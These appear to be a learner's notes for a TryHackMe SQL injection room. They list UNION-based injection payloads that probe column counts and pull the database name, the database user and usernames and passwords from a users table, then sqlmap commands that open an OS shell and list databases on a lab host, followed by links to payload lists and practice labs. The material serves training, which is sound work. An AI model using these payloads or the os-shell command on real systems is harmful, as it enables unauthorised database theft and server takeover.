Task 7 Unit 7 - Union Based SQLi 
' UNION SELECT NULL --
' UNION SELECT NULL,NULL -- //
' UNION SELECT NULL,NULL,NULL, -- //
' UNION SELECT NULL,NULL,NULL,NULL-- //
' UNION SELECT NULL,NULL,NULL,NULL,NULL -- //


' UNION SELECT NULL 'a' -- //


' UNION SELECT NULL,NULL,NULL,NULL,'a' -- //
' UNION SELECT NULL,NULL,NULL,'a',NULL -- //
' UNION SELECT NULL,NULL,'a',NULL,NULL -- //
' UNION SELECT NULL,'a',NULL,NULL,NULL -- //
' UNION SELECT 'a',NULL,NULL,NULL,NULL -- //

' UNION SELECT NULL,database(),NULL,NULL,NULL -- //
database()
or 
' UNION SELECT NULL,NULL,database(),NULL,NULL -- //
...
	sqlitraining

user(),@@version,username,password

' UNION SELECT NULL,NULL,user(),NULL,NULL -- //

' union select null, id, username, password, fname from users -- //


Task 8 Unit 8 - Automating exploitation 
sql
https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet


How would you get an OS shell on website "sqli.thm/login.php"? (URL switch comes first)
sqlmap -u "http://10.10.179.137/login.php" --os-shell
sqlmap -u sqli.thm/login.php — os-shell




What about listing all databases on the same website? (URL switch comes first)


sqlmap -u "sqli.thm/login.php" --dbs

https://tryhackme.com/room/sqlibasics

Congratulations! You have successfully gone through the major part of SQLi. Now, with all that knowledge it won't take long for you to pick up on small tricks and tactics by reading and researching more. I have attached a some further SQLi resources for you to explore. Enjoy!

If you have any questions or willing to leave feedback, you can easily reach me out on TryHackMe discord.
Good luck with your studies!

Payload Lists:
1. https://github.com/payloadbox/sql-injection-payload-list 
2. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection 

Guides & Blogs:
1. https://www.sqlinjection.net/
2. http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet 
3. https://github.com/trietptm/SQL-Injection-Payloads 
4. https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet 
5. https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/ 
(Special thanks to TheMayor for linking the last one)

Labs and practice:
1. https://portswigger.net/web-security/sql-injection
2. https://github.com/Audi-1/sqli-labs
3. https://github.com/appsecco/sqlinjection-training-app
4. https://tryhackme.com/room/gamezone 
5. https://tryhackme.com/room/avengers
6. https://tryhackme.com/room/uopeasy 
7. https://tryhackme.com/room/jurassicpark 


